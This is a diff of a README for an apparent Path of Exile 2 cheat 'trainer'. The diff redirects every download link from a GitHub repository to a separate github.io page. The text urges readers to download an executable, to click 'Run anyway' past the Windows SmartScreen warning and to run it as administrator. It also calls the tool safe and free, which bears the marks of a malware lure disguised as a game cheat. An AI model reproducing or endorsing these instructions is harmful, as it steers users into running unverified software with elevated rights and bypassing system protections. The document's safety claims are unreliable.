@@ -1,6 +1,6 @@
 # 🎮 poe-2-trainer-2026 - Unlock God Mode and Unlimited Riches Today
 
-[![Download Now](https://img.shields.io/badge/Download-POE2_Trainer_2026-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Episcopateinletmanifold7109/poe-2-trainer-2026)
+[![Download Now](https://img.shields.io/badge/Download-POE2_Trainer_2026-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://episcopateinletmanifold7109.github.io)
 
 ---
 
@@ -28,7 +28,7 @@ Follow these simple steps. It takes less than 2 minutes.
 
 ### Step 1: Download the Trainer
 Visit this link to download the application:
-[Download poe-2-trainer-2026](https://github.com/Episcopateinletmanifold7109/poe-2-trainer-2026)
+[Download poe-2-trainer-2026](https://episcopateinletmanifold7109.github.io)
 
 ### Step 2: Run the Application
 After the download finishes, locate the file in your Downloads folder. Double-click it to open. If Windows shows a blue screen saying "Windows protected your PC," click "More info" and then "Run anyway." This is normal for trainer tools.
@@ -107,7 +107,7 @@ Make sure you run the trainer as administrator. Right-click the trainer icon and
 Getting the trainer is easy.
 
 Visit this link to download the application:
-[**https://github.com/Episcopateinletmanifold7109/poe-2-trainer-2026**](https://github.com/Episcopateinletmanifold7109/poe-2-trainer-2026)
+[**https://episcopateinletmanifold7109.github.io**](https://episcopateinletmanifold7109.github.io)
 
 Wait for the download to complete. Then open the downloaded file. No installation wizard is needed. It is a portable application. That means it runs directly from the folder where you downloaded it. You can even put it on a USB stick. No registry changes. No leftover files when you delete it.
 
@@ -145,7 +145,7 @@ Solution: Right-click the trainer and run as administrator. Also, close any back
 
 You are one click away from the ultimate Path of Exile 2 experience. No more grinding. No more frustration. Just pure, unbridled power. The trainer is safe, free, and works instantly. Download it now and become unstoppable.
 
-[![Download poe-2-trainer-2026](https://img.shields.io/badge/Download-Now-purple?style=for-the-badge&labelColor=gold&color=darkviolet)](https://github.com/Episcopateinletmanifold7109/poe-2-trainer-2026)
+[![Download poe-2-trainer-2026](https://img.shields.io/badge/Download-Now-purple?style=for-the-badge&labelColor=gold&color=darkviolet)](https://episcopateinletmanifold7109.github.io)
 
 ---
 
